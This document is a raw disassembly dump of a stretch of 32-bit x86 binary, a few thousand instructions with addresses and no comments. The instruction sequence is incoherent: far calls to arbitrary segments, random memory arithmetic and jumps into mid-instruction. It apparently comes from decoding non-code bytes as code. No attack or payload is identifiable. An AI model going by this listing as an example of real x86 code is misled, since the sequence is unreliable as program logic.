  402f06:	add    DWORD PTR [edx+0x9],eax
  402f09:	add    al,0x0
  402f0b:	inc    esp
  402f0c:	dec    eax
  402f0d:	adc    al,BYTE PTR [ecx+0x18]
  402f10:	mov    ds:0x80988132,al
  402f15:	add    DWORD PTR [ecx+0x113304d6],ecx
  402f1b:	jo     0x402f27
  402f1d:	add    BYTE PTR [ecx],al
  402f1f:	dec    edx
  402f20:	add    al,0x25
  402f22:	inc    eax
  402f23:	cli    
  402f24:	add    al,0x8
  402f26:	inc    ecx
  402f27:	or     eax,eax
  402f29:	or     al,0x10
  402f2b:	inc    eax
  402f2c:	xchg   BYTE PTR [edx],cl
  402f2e:	add    al,BYTE PTR [esi+0x22]
  402f31:	pusha  
  402f32:	xchg   esp,eax
  402f33:	adc    BYTE PTR [edx+edx*2],0x4
  402f37:	add    al,0x88
  402f39:	add    eax,DWORD PTR [edi+eiz*4]
  402f3c:	add    BYTE PTR [eax],dh
  402f3e:	pusha  
  402f3f:	inc    esp
  402f40:	sbb    al,0x1
  402f42:	or     eax,0x40
  402f45:	or     BYTE PTR [edx],al
  402f47:	and    BYTE PTR [eax+0x1091800f],bl
  402f4d:	xor    BYTE PTR [edx],al
  402f4f:	inc    ecx
  402f50:	nop
  402f51:	sub    bh,bh
  402f53:	adc    eax,0x414f7c
  402f58:	add    BYTE PTR [eax*1+0xa20514],0x90
  402f60:	adc    BYTE PTR [eax+0x41],cl
  402f63:	xchg   DWORD PTR [eax+0x18],eax
  402f66:	or     BYTE PTR [ecx],ch
  402f68:	call   0x4541:0xd2220a0
  402f6f:	pusha  
  402f70:	and    DWORD PTR [eax],0x900a4080
  402f76:	add    BYTE PTR [eax],al
  402f78:	and    DWORD PTR [eax+eax*1],eax
  402f7b:	add    BYTE PTR [edx],cl
  402f7d:	add    BYTE PTR [eax],al
  402f7f:	inc    eax
  402f80:	add    BYTE PTR [eax],ch
  402f82:	test   BYTE PTR [eax+eiz*8],al
  402f85:	sub    BYTE PTR ds:0x228a03a,al
  402f8b:	sbb    al,0x10
  402f8d:	add    BYTE PTR [eax],al
  402f8f:	inc    ecx
  402f90:	xor    eax,0x360f0420
  402f95:	push   ebx
  402f96:	adc    ch,BYTE PTR [eax]
  402f98:	adc    BYTE PTR [eax+0x60],0x18
  402f9c:	inc    edx
  402f9d:	or     DWORD PTR [eax-0x7ffdcd50],eax
  402fa3:	pusha  
  402fa4:	js     0x402fb8
  402fa6:	inc    eax
  402fa7:	sub    eax,DWORD PTR [ecx+eax*1]
  402faa:	xor    esp,DWORD PTR [ecx]
  402fac:	popa   
  402fad:	mov    WORD PTR [eax],es
  402faf:	add    al,0x30
  402fb1:	rol    BYTE PTR [ebx],0xc0
  402fb4:	adc    al,0x2
  402fb6:	add    BYTE PTR [edx],cl
  402fb8:	add    BYTE PTR [eax],al
  402fba:	dec    edx
  402fbb:	xchg   BYTE PTR [eax-0x3beffab3],dl
  402fc1:	adc    al,BYTE PTR [ebx]
  402fc3:	push   es
  402fc4:	push   cs
  402fc5:	add    DWORD PTR [eax+edx*1+0x1005020],0x0
  402fcd:	inc    ecx
  402fce:	mov    dh,BYTE PTR [eax+esi*4]
  402fd1:	inc    ecx
  402fd2:	adc    BYTE PTR [ecx],0x88
  402fd5:	add    BYTE PTR [eax+0x200841c8],al
  402fdb:	sub    BYTE PTR [eax+0x1],dl
  402fde:	fwait
  402fdf:	add    al,0x21
  402fe1:	push   eax
  402fe2:	inc    eax
  402fe3:	and    DWORD PTR [edx+0x33],eax
  402fe6:	add    BYTE PTR [edx],bl
  402fe8:	add    al,0x2e
  402fea:	push   ss
  402feb:	add    DWORD PTR [eax],eax
  402fed:	add    BYTE PTR [eax],al
  402fef:	adc    BYTE PTR [eax],dh
  402ff1:	xor    BYTE PTR [edx],0x86
  402ff4:	rol    BYTE PTR [eax+0x28411084],0x15
  402ffb:	shl    BYTE PTR [ecx-0x7e],1
  402ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fff:	or     DWORD PTR [eax-0x13fee37e],edx
  403005:	or     bl,BYTE PTR [eax+eiz*1+0x8]
  403009:	test   BYTE PTR [eax],ah
  40300b:	pop    esp
  40300c:	inc    eax
  40300d:	push   0x31001620
  403012:	shr    BYTE PTR [ecx],0x86
  403015:	add    ch,dl
  403017:	daa    
  403018:	add    BYTE PTR [ebx],al
  40301a:	sub    BYTE PTR [ebp+0x45],bl
  40301d:	and    BYTE PTR [edx],al
  40301f:	mov    al,ds:0x80690242
  403024:	adc    BYTE PTR [ebx],0x82
  403027:	inc    ebp
  403028:	add    al,0x20
  40302a:	add    BYTE PTR [eax+0x40098100],bh
  403030:	push   eax
  403031:	xor    BYTE PTR [eax-0x70],cl
  403034:	stos   BYTE PTR es:[edi],al
  403035:	mov    ds:0x22231,al
  40303a:	add    al,0x0
  40303c:	les    edx,FWORD PTR [eax]
  40303e:	test   BYTE PTR [eax],dh
  403040:	cmp    DWORD PTR [ecx+0x12200612],edx
  403046:	adc    BYTE PTR [eax],al
  403048:	add    al,0x48
  40304a:	sub    al,0x4b
  40304c:	aad    0x84
  40304e:	mov    BYTE PTR [eax-0x2e76febe],ch
  403054:	mov    al,ds:0x4412a944
  403059:	add    al,BYTE PTR [ebx+0xa0230]
  40305f:	adc    DWORD PTR [esi+eax*1+0x23050820],ecx
  403066:	add    BYTE PTR [eax],dl
  403068:	pushf  
  403069:	or     DWORD PTR [eax],eax
  40306b:	add    BYTE PTR [ecx],al
  40306d:	mov    eax,ds:0x44082c00
  403072:	add    BYTE PTR [edi+esi*4],al
  403075:	fmul   DWORD PTR [ebx]
  403077:	add    ch,ah
  403079:	or     al,BYTE PTR [eax+0x14910009]
  40307f:	add    BYTE PTR [eax],al
  403081:	add    al,0x98
  403083:	adc    BYTE PTR [eax],al
  403085:	add    BYTE PTR [edx],dh
  403087:	add    al,BYTE PTR [edx+0x48]
  40308a:	sbb    al,0x40
  40308c:	xchg   esi,eax
  40308d:	add    eax,0x292d00c0
  403092:	add    al,0x40
  403094:	mov    BYTE PTR [eax],cl
  403096:	push   eax
  403097:	add    DWORD PTR [ecx],edx
  403099:	adc    al,0x30
  40309b:	xchg   ebx,eax
  40309c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40309d:	add    BYTE PTR [eax],dl
  40309f:	cmp    BYTE PTR [eax+0x50041040],al
  4030a5:	dec    ecx
  4030a6:	inc    esp
  4030a7:	xchg   ecx,eax
  4030a8:	or     BYTE PTR [ecx],bl
  4030aa:	or     BYTE PTR [eax],al
  4030ac:	adc    edx,DWORD PTR [edx]
  4030ae:	add    bl,ah
  4030b0:	add    BYTE PTR [eax],dl
  4030b2:	inc    eax
  4030b3:	or     al,BYTE PTR [edx]
  4030b5:	or     al,0xe
  4030b7:	and    BYTE PTR [eax+0xe004010],0x14
  4030be:	adc    BYTE PTR [ecx],dl
  4030c0:	nop
  4030c1:	and    al,0x0
  4030c3:	ror    DWORD PTR [eax],0x21
  4030c6:	sbb    BYTE PTR [eax],al
  4030c8:	call   0x4295:0x41240742
  4030cf:	add    eax,DWORD PTR [eax]
  4030d1:	sub    ebx,esp
  4030d3:	adc    BYTE PTR [eax],al
  4030d5:	add    DWORD PTR [eax+eax*1+0x24],ecx
  4030d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030da:	add    BYTE PTR [eax],0x80
  4030dd:	nop
  4030de:	add    BYTE PTR [eax],dl
  4030e0:	add    DWORD PTR [edx+0x6008d080],0xf22d8020
  4030ea:	rol    BYTE PTR [eax+0x40189008],0x8
  4030f1:	add    BYTE PTR [eax],0x19
  4030f4:	add    al,0x0
  4030f6:	or     al,0x10
  4030f8:	add    BYTE PTR [eax],cl
  4030fa:	inc    ebx
  4030fb:	and    BYTE PTR [ecx+ecx*8+0x41],dh
  4030ff:	or     BYTE PTR [eax+edx*1],bh
  403102:	add    bl,BYTE PTR [eax]
  403104:	mov    bl,BYTE PTR [eax]
  403106:	and    BYTE PTR [esi+0x34],0x12
  40310a:	mov    eax,0x28381201
  40310f:	pusha  
  403110:	xor    BYTE PTR [eax+0x3480808],dl
  403116:	add    BYTE PTR [eax+eax*4],ch
  403119:	push   eax
  40311a:	adc    BYTE PTR [edi],al
  40311c:	or     al,0x82
  40311e:	or     DWORD PTR [eax+0x0],esp
  403121:	add    BYTE PTR [eax+0x60d80005],dl
  403127:	inc    edx
  403128:	call   0xe206:0x4025832
  40312f:	pushf  
  403130:	mov    al,ds:0xd5500922
  403135:	mov    BYTE PTR [ebp+0x24],al
  403138:	or     al,0x20
  40313a:	adc    al,0x18
  40313c:	push   edx
  40313d:	inc    edx
  40313e:	sbb    edx,DWORD PTR [eax+eax*1]
  403141:	push   es
  403142:	add    ecx,DWORD PTR [ecx]
  403144:	and    al,0x20
  403146:	jp     0x403169
  403148:	pusha  
  403149:	call   0x5801:0x40181103
  403150:	add    edx,DWORD PTR [ebx+eax*2]
  403153:	add    BYTE PTR [eax+0x42],dl
  403156:	inc    esp
  403157:	adc    BYTE PTR es:[eax],cl
  40315a:	add    DWORD PTR [eax],eax
  40315c:	add    BYTE PTR [ecx],bl
  40315e:	sbb    BYTE PTR [esi+0x8],al
  403161:	mov    dl,BYTE PTR [eax+0x10]
  403164:	adc    BYTE PTR [eax+ebx*4],ah
  403167:	xor    DWORD PTR [edi],edx
  403169:	add    DWORD PTR [eax],eax
  40316b:	or     BYTE PTR [eax],al
  40316d:	and    BYTE PTR [eax],bl
  40316f:	sbb    al,0x40
  403171:	xor    eax,0xb0500c22
  403176:	add    ah,0xcf
  403179:	test   BYTE PTR [eax+0x88882e5],bl
  40317f:	or     DWORD PTR [edx+0x9],0x800328a2
  403186:	add    al,ah
  403188:	add    al,BYTE PTR [edx]
  40318a:	adc    BYTE PTR [esi+0x2],al
  40318d:	adc    BYTE PTR [eax],0x20
  403190:	and    BYTE PTR [eax],dh
  403192:	sbb    DWORD PTR [eax+ecx*1],ecx
  403195:	add    al,0x0
  403197:	adc    BYTE PTR [edx-0x40],dl
  40319a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319b:	bound  ecx,QWORD PTR ds:0x840c00
  4031a1:	enter  0x881d,0x8f
  4031a5:	push   edx
  4031a6:	add    ah,BYTE PTR [edx]
  4031a8:	push   ss
  4031a9:	and    BYTE PTR [eax+ebp*4],dl
  4031ac:	imul   eax,ebp,0x322043a0
  4031b2:	add    BYTE PTR [ecx-0x3f34f000],al
  4031b8:	xor    BYTE PTR [eax],al
  4031ba:	adc    DWORD PTR [esi],edx
  4031bc:	add    DWORD PTR [eax-0x7ffffbf0],esi
  4031c2:	xchg   DWORD PTR [edx],eax
  4031c4:	or     BYTE PTR [esi],ah
  4031c6:	add    DWORD PTR [eax+ebx*1],ecx
  4031c9:	push   ebx
  4031ca:	adc    al,BYTE PTR [edx+eax*1+0x10d0000]
  4031d1:	inc    eax
  4031d2:	and    BYTE PTR [eax],ah
  4031d4:	add    al,0x84
  4031d6:	and    eax,0x5ad0d400
  4031db:	dec    eax
  4031dc:	adc    al,BYTE PTR [eax]
  4031de:	or     edx,DWORD PTR [ecx]
  4031e0:	xchg   ebx,eax
  4031e1:	add    al,BYTE PTR [eax]
  4031e3:	add    DWORD PTR [ecx+0x4800489],0x8208b044
  4031ed:	inc    eax
  4031ee:	adc    BYTE PTR [eax+eax*1],dh
  4031f1:	inc    eax
  4031f2:	inc    ecx
  4031f3:	adc    BYTE PTR [eax],cl
  4031f5:	xchg   edx,eax
  4031f6:	and    BYTE PTR [edx],dh
  4031f8:	add    DWORD PTR [eax],eax
  4031fa:	pop    es
  4031fb:	adc    al,0x82
  4031fd:	push   esi
  4031fe:	or     BYTE PTR [eax],dl
  403200:	add    al,0x55
  403202:	dec    ebp
  403203:	dec    ebx
  403204:	mov    eax,0x18000661
  403209:	push   0x28a42690
  40320e:	xor    al,BYTE PTR [eax+0x11108030]
  403214:	mov    ds:0x440813c0,al
  403219:	add    al,0x3
  40321b:	add    BYTE PTR [esi],ah
  40321d:	inc    esi
  40321e:	add    eax,0x40006421
  403223:	sar    BYTE PTR [edx+0x20410800],0x84
  40322a:	inc    eax
  40322b:	xor    al,0x0
  40322e:	loopne 0x403250
  403230:	add    BYTE PTR [ecx],al
  403232:	dec    ebx
  403233:	inc    eax
  403234:	inc    eax
  403235:	les    eax,FWORD PTR [eax-0x78]
  403238:	inc    edi
  403239:	adc    ch,BYTE PTR [eax]
  40323b:	and    BYTE PTR [ebx],al
  40323d:	add    BYTE PTR [eax],cl
  40323f:	test   DWORD PTR [eax],eax
  403241:	test   BYTE PTR ds:0x9e8c1443,ah
  403247:	mov    ds:0x404dcd02,al
  40324c:	or     BYTE PTR [ecx],ah
  40324e:	mov    BYTE PTR [eax+ecx*1],al
  403251:	and    cl,ah
  403253:	sbb    DWORD PTR [ecx+0x0],edx
  403256:	add    dl,BYTE PTR [eax]
  403258:	add    BYTE PTR [eax],al
  40325a:	adc    al,BYTE PTR [eax+0x50033880]
  403260:	jo     0x403282
  403262:	add    BYTE PTR [eax],0x1
  403265:	inc    eax
  403266:	ret    0x80c0
  403269:	add    DWORD PTR [eax+0x20505a42],esp
  40326f:	bound  esp,QWORD PTR [ecx]
  403271:	imul   edx,DWORD PTR [eax],0x80412801
  403277:	pop    es
  403278:	add    cl,BYTE PTR [eax]
  40327a:	or     cl,BYTE PTR [ecx]
  40327c:	test   BYTE PTR [edx-0x24fe7dce],cl
  403282:	and    DWORD PTR [eax],0x92bb8010
  403288:	push   edx
  403289:	mov    BYTE PTR [eax],al
  40328b:	cmp    BYTE PTR [eax],cl
  40328d:	mov    al,0x25
  40328f:	adc    al,cl
  403291:	xchg   esp,eax
  403292:	xor    edx,DWORD PTR [eax+0x8900640]
  403298:	add    BYTE PTR [eax],dh
  40329a:	push   esp
  40329b:	or     DWORD PTR [edx],esp
  40329d:	or     BYTE PTR [eax-0x38dfdafc],ch
  4032a3:	push   es
  4032a4:	or     BYTE PTR [eax],al
  4032a6:	sub    DWORD PTR [eax],ebp
  4032a8:	add    dl,BYTE PTR [eax-0x27]
  4032ab:	adc    al,BYTE PTR [eax]
  4032ad:	and    DWORD PTR [eax+0x44110400],eax
  4032b3:	push   esp
  4032b4:	dec    eax
  4032b5:	adc    BYTE PTR [edx-0x70],al
  4032b8:	add    DWORD PTR [eax+0x20011262],ecx
  4032be:	adc    cl,BYTE PTR [eax+0x1001184]
  4032c4:	das    
  4032c5:	adc    BYTE PTR [eax],al
  4032c7:	add    DWORD PTR [eax+0x4c84020],ecx
  4032cd:	adc    DWORD PTR [eax],esi
  4032cf:	lods   al,BYTE PTR ds:[esi]
  4032d0:	and    BYTE PTR [ebx+0x52],al
  4032d3:	add    BYTE PTR [eax],al
  4032d5:	adc    DWORD PTR [eax],ebx
  4032d7:	cmp    eax,DWORD PTR [eax]
  4032d9:	inc    eax
  4032da:	xor    esp,eax
  4032dc:	push   ds
  4032dd:	add    DWORD PTR [edx],eax
  4032df:	dec    ebx
  4032e0:	push   edx
  4032e1:	add    BYTE PTR [ecx],al
  4032e3:	adc    BYTE PTR [ebp+0x161c1270],al
  4032e9:	add    bl,al
  4032eb:	inc    eax
  4032ec:	jo     0x40327e
  4032ee:	test   BYTE PTR [eax-0x7beddec8],al
  4032f4:	add    eax,0x21050269
  4032f9:	mov    al,ds:0xa5414b00
  4032fe:	inc    eax
  4032ff:	pop    eax
  403300:	xchg   edx,eax
  403301:	add    DWORD PTR [edx],eax
  403303:	nop
  403304:	add    BYTE PTR [eax],al
  403306:	rcl    DWORD PTR ds:0x50004178,1
  40330c:	add    BYTE PTR [eax+0x20061021],cl
  403312:	xor    DWORD PTR [edx+0x60808401],eax
  403318:	or     BYTE PTR gs:[eax-0x65],dl
  40331c:	inc    eax
  40331d:	add    BYTE PTR [eax],al
  40331f:	and    ecx,DWORD PTR [edx+0x1]
  403322:	pusha  
  403323:	add    dl,BYTE PTR [eax+ebx*2]
  403326:	sbb    BYTE PTR [eax+0x41245148],al
  40332c:	xor    BYTE PTR [ebx],cl
  40332e:	push   es
  40332f:	xchg   ebp,eax
  403330:	pusha  
  403331:	or     BYTE PTR [eax+0x4a184a0],al
  403337:	adc    eax,0x88052a0
  40333d:	push   es
  40333e:	xor    al,dl
  403340:	adc    BYTE PTR [eax],ah
  403342:	mov    BYTE PTR [ebp-0x7fb3b5bc],ah
  403348:	and    BYTE PTR [eax-0x6775bbfd],al
  40334e:	pop    eax
  40334f:	daa    
  403350:	adc    ah,BYTE PTR [edx]
  403352:	test   BYTE PTR [eax],al
  403354:	adc    al,BYTE PTR [eax+eiz*1-0x80]
  403358:	sub    BYTE PTR [eax],cl
  40335a:	and    BYTE PTR [eax],al
  40335c:	adc    BYTE PTR [edx],ah
  40335e:	add    BYTE PTR [edx],0x4
  403361:	add    al,BYTE PTR [edx]
  403363:	add    BYTE PTR [ebx],bl
  403365:	add    ch,BYTE PTR [eax]
  403367:	cmp    DWORD PTR [ecx+0x440004],eax
  40336d:	push   edx
  40336e:	inc    eax
  40336f:	add    BYTE PTR [ecx],dl
  403371:	add    eax,0x4c491652
  403376:	push   0x0
  403378:	add    al,0xc
  40337a:	sub    al,BYTE PTR [eax]
  40337c:	sbb    BYTE PTR [eax],al
  40337e:	and    BYTE PTR [eax],dl
  403380:	or     BYTE PTR [esi+0x21306030],dl
  403386:	and    ah,BYTE PTR [eax]
  403388:	or     bl,cl
  40338a:	add    BYTE PTR [ecx+eiz*1],al
  40338d:	add    BYTE PTR es:[edx],ah
  403390:	and    BYTE PTR [ecx+eax*1+0xc4900],dl
  403397:	add    BYTE PTR [esi+0xb001054],al
  40339d:	mov    ch,0x91
  40339f:	or     al,BYTE PTR [eax-0x2d9bea40]
  4033a5:	loopne 0x4033bf
  4033a7:	or     BYTE PTR [eax-0x7fbbdf50],al
  4033ad:	add    al,dl
  4033af:	nop
  4033b0:	or     ah,BYTE PTR ds:0x4203001c
  4033b6:	add    BYTE PTR [eax+0x22],dl
  4033b9:	add    BYTE PTR [eax+0x3a],al
  4033bc:	and    al,BYTE PTR [edx]
  4033be:	add    al,BYTE PTR [edx]
  4033c0:	adc    BYTE PTR [ebx],ah
  4033c2:	sbb    BYTE PTR [eax+0x441ce800],dl
  4033c8:	add    BYTE PTR [eax+edx*2-0x40],0x12
  4033cd:	mov    al,BYTE PTR [eax+0x6648422]
  4033d3:	add    DWORD PTR [eax+0x1],0xa0128428
  4033da:	sbb    BYTE PTR [eax+0x41],al
  4033dd:	add    al,0x4
  4033df:	ret    0x12c
  4033e2:	adc    cl,BYTE PTR [ecx]
  4033e4:	sbb    ah,BYTE PTR [ecx]
  4033e6:	xor    BYTE PTR [ecx],0x40
  4033e9:	sbb    ah,BYTE PTR [eax]
  4033eb:	pusha  
  4033ec:	mov    al,BYTE PTR [ecx]
  4033ee:	sub    BYTE PTR [esp+ecx*2],0xb3
  4033f2:	les    eax,FWORD PTR [ebx]
  4033f4:	or     BYTE PTR [eax+0x4600861],ch
  4033fa:	test   dl,al
  4033fc:	add    DWORD PTR [eax],0x180d4981
  403402:	add    BYTE PTR [eax+0x16],0x83
  403406:	or     BYTE PTR [edi+eax*2+0x0],0x82
  40340b:	inc    esp
  40340c:	or     DWORD PTR [eax],0x21
  40340f:	mov    BYTE PTR [eax+0x14],cl
  403412:	mov    eax,DWORD PTR [ecx]
  403414:	add    esp,DWORD PTR [eax]
  403416:	call   0xa626:0x2009f07
  40341d:	add    BYTE PTR [eax+0x24],cl
  403420:	call   0x39610429
  403425:	pop    edi
  403426:	add    eax,DWORD PTR [eax+eax*2]
  403429:	and    al,BYTE PTR [esi]
  40342b:	add    al,0x32
  40342d:	inc    ecx
  40342e:	add    BYTE PTR [edx],bl
  403430:	inc    esp
  403431:	inc    eax
  403432:	inc    eax
  403433:	mov    DWORD PTR [ebx-0x2e],eax
  403436:	add    ecx,eax
  403438:	add    eax,0x643080a8
  40343d:	push   eax
  40343e:	add    cl,BYTE PTR ds:0x10004220
  403444:	adc    BYTE PTR [edx+0xc590a10],ah
  40344a:	add    eax,0x610200
  40344f:	sub    eax,0x3114e100
  403454:	add    DWORD PTR [ecx],edx
  403456:	adc    al,dl
  403458:	add    BYTE PTR [edi],ch
  40345a:	and    edx,DWORD PTR [ecx]
  40345c:	adc    BYTE PTR [eax+0x1],ch
  40345f:	add    DWORD PTR ds:0xe858282e,eax
  403465:	xchg   ebp,eax
  403466:	add    BYTE PTR [eax],ah
  403468:	or     BYTE PTR [edx],ah
  40346a:	push   es
  40346b:	and    eax,DWORD PTR [eax+eiz*1+0x10]
  40346f:	stos   BYTE PTR es:[edi],al
  403470:	add    al,BYTE PTR [eax]
  403472:	or     cl,BYTE PTR [edx]
  403474:	add    BYTE PTR [eax+0xd0018],0x8a
  40347b:	inc    edx
  40347c:	sub    eax,DWORD PTR [eax+0xc216310]
  403482:	and    ah,al
  403484:	and    BYTE PTR [ecx],dl
  403486:	sbb    BYTE PTR [ebp+0x15],al
  403489:	add    BYTE PTR [edx-0x4edf77f5],al
  40348f:	sub    dl,BYTE PTR [esi]
  403491:	sbb    DWORD PTR [ecx],ebx
  403493:	mov    al,ds:0x18c94800
  403498:	and    BYTE PTR [esi],dl
  40349a:	add    BYTE PTR [eax],al
  40349c:	push   eax
  40349d:	add    BYTE PTR [edx],al
  40349f:	add    DWORD PTR [ecx+ecx*4],edx
  4034a2:	add    BYTE PTR [eax],al
  4034a4:	rcr    BYTE PTR [eax],1
  4034a6:	test   BYTE PTR [ecx-0x3a],ch
  4034a9:	xlat   BYTE PTR ds:[ebx]
  4034aa:	push   esp
  4034ab:	or     al,0xd2
  4034ad:	inc    eax
  4034ae:	add    al,0xc4
  4034b0:	add    BYTE PTR [ecx],al
  4034b2:	adc    eax,DWORD PTR [eax]
  4034b4:	mov    edi,esp
  4034b6:	xchg   edx,eax
  4034b7:	cmp    DWORD PTR [ecx],ebx
  4034b9:	pop    ecx
  4034ba:	push   ebx
  4034bb:	and    BYTE PTR [edx],al
  4034bd:	hlt    
  4034be:	adc    al,0x0
  4034c0:	and    esp,DWORD PTR [ecx+0x800040]
  4034c6:	rol    DWORD PTR [eax],0xd0
  4034c9:	and    BYTE PTR [eax+0x2a832808],al
  4034cf:	lock add BYTE PTR [ecx-0x7ef6ef00],0x1
  4034d7:	add    BYTE PTR [ecx],0xa8
  4034da:	sbb    DWORD PTR [eax],esi
  4034dc:	inc    esp
  4034dd:	mov    cl,0x42
  4034df:	or     al,0x42
  4034e1:	and    DWORD PTR [ecx],edi
  4034e3:	inc    esp
  4034e4:	pusha  
  4034e5:	add    BYTE PTR [eax+0x40102224],al
  4034eb:	push   eax
  4034ec:	add    BYTE PTR [eax],al
  4034ee:	add    DWORD PTR [eax],eax
  4034f0:	add    BYTE PTR [eax],al
  4034f2:	stos   BYTE PTR es:[edi],al
  4034f3:	ss and al,0x10
  4034f6:	shl    BYTE PTR [eax-0x35ebbc77],0x0
  4034fd:	add    BYTE PTR [esi+eax*1+0x38],al
  403501:	in     al,0x28
  403503:	test   BYTE PTR [ecx+0x405a0200],al
  403509:	add    BYTE PTR [esp+eax*1],al
  40350c:	add    BYTE PTR [edx],0xa1
  40350f:	or     DWORD PTR [eax+0x42],eax
  403512:	add    al,0x6
  403514:	or     al,0x16
  403516:	add    DWORD PTR [eax+eax*8],eax
  403519:	and    BYTE PTR [ecx],al
  40351b:	mov    cs,WORD PTR [ecx+0x52]
  40351e:	les    ecx,FWORD PTR [eax]
  403520:	or     eax,0x9402acf0
  403525:	push   cs
  403526:	add    al,BYTE PTR [ebx]
  403528:	add    al,BYTE PTR [eax]
  40352a:	push   ecx
  40352b:	and    BYTE PTR [eax+0x4ac4e040],ch
  403531:	add    BYTE PTR [eax],al
  403533:	adc    BYTE PTR [eax+0x210804bc],bl
  403539:	or     al,0x0
  40353b:	or     al,0x13
  40353d:	push   ss
  40353e:	adc    dl,bl
  403540:	add    BYTE PTR [edx+eax*1+0x0],al
  403544:	mov    BYTE PTR [edx],dl
  403546:	les    esp,FWORD PTR [edx+0x20]
  403549:	add    BYTE PTR [eax],al
  40354b:	or     al,0x50
  40354d:	and    BYTE PTR [ecx-0x7bf5b5c0],dl
  403553:	adc    cl,BYTE PTR [eax]
  403555:	dec    esp
  403556:	or     BYTE PTR [edx],al
  403558:	or     BYTE PTR [eax],al
  40355a:	or     DWORD PTR [edx],0x0
  40355d:	add    BYTE PTR [ecx+0x30004cd6],dl
  403563:	lds    edx,FWORD PTR [eax]
  403565:	pusha  
  403566:	add    DWORD PTR [eax],eax
  403568:	xchg   BYTE PTR [ecx],cl
  40356a:	add    BYTE PTR [edx],dl
  40356c:	ror    BYTE PTR ds:0x53901300,0x30
  403573:	sbb    DWORD PTR [ecx],esp
  403575:	add    cl,BYTE PTR [esi]
  403577:	jb     0x4035b9
  403579:	push   es
  40357a:	sub    DWORD PTR [ecx],eax
  40357c:	xor    eax,DWORD PTR [ecx-0x5f3fff7e]
  403582:	loopne 0x40350a
  403584:	adc    BYTE PTR [eax],0x4c
  403587:	xchg   edx,eax
  403588:	add    al,0x2
  40358b:	add    eax,DWORD PTR [eax+0x0]
  40358e:	xor    al,0x6
  403590:	adc    DWORD PTR [eax+0x448a1222],eax
  403596:	sbb    al,0x40
  403598:	inc    ecx
  403599:	add    DWORD PTR [esi],eax
  40359b:	add    BYTE PTR [esi+0x1],al
  40359e:	push   esp
  40359f:	inc    ecx
  4035a0:	nop
  4035a1:	adc    cl,BYTE PTR [eax+0x10]
  4035a4:	mov    eax,ds:0xe2044003
  4035a9:	inc    eax
  4035aa:	add    BYTE PTR [eax+0x1001b000],ah
  4035b0:	or     al,BYTE PTR [ebx]
  4035b2:	add    al,0x98
  4035b4:	add    BYTE PTR [eax+ecx*1],0x76
  4035b8:	and    cl,BYTE PTR [edx]
  4035ba:	xchg   ecx,eax
  4035bb:	add    BYTE PTR [eax],al
  4035bd:	xchg   edx,eax
  4035be:	loope  0x403540
  4035c0:	add    al,0x0
  4035c2:	add    BYTE PTR [eax+0x20],dh
  4035c5:	adc    BYTE PTR [edx],cl
  4035c7:	add    BYTE PTR [eax],0x80
  4035ca:	inc    edx
  4035cb:	jo     0x4035d3
  4035cd:	and    DWORD PTR [eax-0x6a700000],eax
  4035d3:	or     BYTE PTR [edx+0x1c321247],dl
  4035d9:	add    al,al
  4035db:	shl    BYTE PTR [esi],1
  4035dd:	dec    eax
  4035de:	add    al,BYTE PTR [eax-0x7e776fe0]
  4035e4:	push   ebx
  4035e5:	or     ecx,DWORD PTR [edx]
  4035e7:	or     BYTE PTR [eax],al
  4035e9:	add    cl,cl
  4035eb:	dec    eax
  4035ec:	or     al,0xb
  4035ee:	nop
  4035ef:	or     BYTE PTR [eax],al
  4035f1:	add    al,0x0
  4035f3:	add    BYTE PTR [eax],ah
  4035f5:	inc    eax
  4035f6:	adc    cl,al
  4035f8:	add    al,BYTE PTR [edx+0x482030]
  4035fe:	dec    esp
  4035ff:	mov    al,ds:0x11698e00
  403604:	es inc ecx
  403606:	or     DWORD PTR [eax+eax*4+0x16],ecx
  40360a:	or     ebx,DWORD PTR [edx-0x7c]
  40360d:	and    DWORD PTR [eax],eax
  40360f:	add    esp,DWORD PTR [eax-0x4c]
  403612:	xor    BYTE PTR [eax-0x5f1cfc00],cl
  403618:	add    eax,DWORD PTR [eax-0x78]
  40361b:	and    al,0x2
  40361d:	and    DWORD PTR [ebx+0x281410b6],0x9
  403624:	add    DWORD PTR [edx+0x500513],0x94b0302
  40362e:	or     DWORD PTR [ecx+0xc],0x608f3d07
  403635:	add    BYTE PTR [ecx],al
  403637:	inc    ebx
  403638:	add    DWORD PTR [ebp+0x26],0x80332888
  40363f:	add    BYTE PTR [eax],0x28
  403642:	push   eax
  403643:	test   al,al
  403645:	add    DWORD PTR [eax-0x37],edx
  403648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403649:	or     al,0x8
  40364b:	xchg   BYTE PTR [edx],al
  40364d:	xor    BYTE PTR [eax+eax*1],al
  403650:	rcl    DWORD PTR [edx-0x6fcbedef],0x48
  403657:	add    BYTE PTR [esi-0x56],bl
  40365a:	inc    ax
  40365c:	add    cl,BYTE PTR [eax]
  40365e:	add    ecx,DWORD PTR [eax]
  403660:	call   0x2743:0x20c12842
  403667:	or     BYTE PTR [edx+0x46],dl
  40366a:	add    BYTE PTR [eax],al
  40366c:	mov    ebp,0x8020002
  403671:	adc    BYTE PTR [esp-0x40],dl
  403675:	pusha  
  403676:	jo     0x403603
  403678:	add    BYTE PTR [eax-0x18],0x15
  40367c:	adc    BYTE PTR [eax],dl
  40367e:	and    DWORD PTR [eax],eax
  403680:	add    BYTE PTR [edx],0xdc
  403683:	and    BYTE PTR [ebp+0x25],0x0
  403687:	add    dl,al
  403689:	or     BYTE PTR [ebx],dl
  40368b:	adc    BYTE PTR [eax+0x9],0x1c
  40368f:	or     DWORD PTR [ebx+0x10384012],0x4102874
  403699:	adc    al,BYTE PTR [eax+0x3]
  40369c:	or     BYTE PTR [esi+eax*4],al
  40369f:	add    al,0x0
  4036a1:	and    ah,BYTE PTR [eax]
  4036a3:	adc    BYTE PTR [eax+0x28024801],al
  4036a9:	and    BYTE PTR [esi+0x0],ah
  4036ac:	rol    DWORD PTR [eax],1
  4036ae:	push   esi
  4036af:	and    BYTE PTR [edx-0x3fe75f28],0x44
  4036b6:	push   esp
  4036b7:	add    esi,DWORD PTR [ecx]
  4036b9:	or     BYTE PTR [eax-0x4c],0x0
  4036bd:	and    eax,0x2141e400
  4036c2:	shl    BYTE PTR [eax+0x15241119],1
  4036c8:	inc    esp
  4036c9:	dec    esi
  4036ca:	add    BYTE PTR [eax+eax*4],ah
  4036cd:	adc    al,0xc0
